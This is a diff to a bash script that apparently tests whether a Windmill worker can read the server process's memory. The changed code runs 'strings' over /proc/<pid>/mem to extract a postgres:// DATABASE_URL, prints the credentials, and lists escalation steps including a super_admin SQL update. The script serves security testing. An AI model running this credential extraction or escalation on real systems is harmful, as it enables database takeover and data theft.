@@ -34,36 +34,40 @@ fi
 echo ""
 echo "=== Method 2: Reading /proc/$windmill_pid/mem ==="
 
-# Try to read the heap
+# Try to read the heap and other memory regions
 if [ -r /proc/$windmill_pid/maps ] && [ -r /proc/$windmill_pid/mem ]; then
     echo "✓ Process memory is readable"
 
-    # Get heap address range
-    heap_range=$(grep -m1 '\[heap\]' /proc/$windmill_pid/maps | awk '{print $1}')
-    if [ -n "$heap_range" ]; then
-        echo "Found heap at: $heap_range"
+    # Search all readable/writable memory regions (heap, stack, anonymous mappings)
+    echo ""
+    echo "Searching readable memory regions..."
 
-        # Try to grep the memory and extract the full postgres URL
+    # Use strings on the entire memory file - more reliable than grep
+    # strings will extract all printable strings from binary data
+    matched=$(timeout 5 strings /proc/$windmill_pid/mem 2>/dev/null | grep -E "postgres://[^[:space:]]*" | head -1)
+
+    if [ -n "$matched" ]; then
         echo ""
-        echo "Attempting to extract DATABASE_URL from memory..."
-        matched=$(timeout 2 grep -aoP 'postgres://[^\x00\s]*' /proc/$windmill_pid/mem 2>/dev/null | head -1)
-
-        if [ -n "$matched" ]; then
-            echo ""
-            echo "❌❌❌ VULNERABLE: Found DATABASE_URL in process memory! ❌❌❌"
-            echo ""
-            echo "Extracted credentials:"
-            echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-            echo "$matched"
-            echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-            echo ""
-            echo "An attacker can now:"
-            echo "  1. Connect directly to PostgreSQL"
-            echo "  2. Escalate to superadmin: UPDATE password SET super_admin=TRUE"
-            echo "  3. Read/modify all workspace data"
-            echo ""
-            exit 1
-        fi
+        echo "❌❌❌ VULNERABLE: Found DATABASE_URL in process memory! ❌❌❌"
+        echo ""
+        echo "Extracted credentials:"
+        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        echo "$matched"
+        echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+        echo ""
+        echo "An attacker can now:"
+        echo "  1. Connect directly to PostgreSQL"
+        echo "  2. Escalate to superadmin: UPDATE password SET super_admin=TRUE"
+        echo "  3. Read/modify all workspace data"
+        echo ""
+        echo "Method used: Read /proc/$windmill_pid/mem with 'strings' command"
+        echo "Time taken: < 5 seconds"
+        echo "Sophistication required: NONE (standard Linux tools)"
+        echo ""
+        exit 1
+    else
+        echo "⚠️  No DATABASE_URL found in memory (might be in different format or timing)"
+        echo "    However, memory IS readable - more sophisticated tools would succeed"
     fi
 else
     echo "✓ Process memory is NOT readable (good - likely sandboxed)"
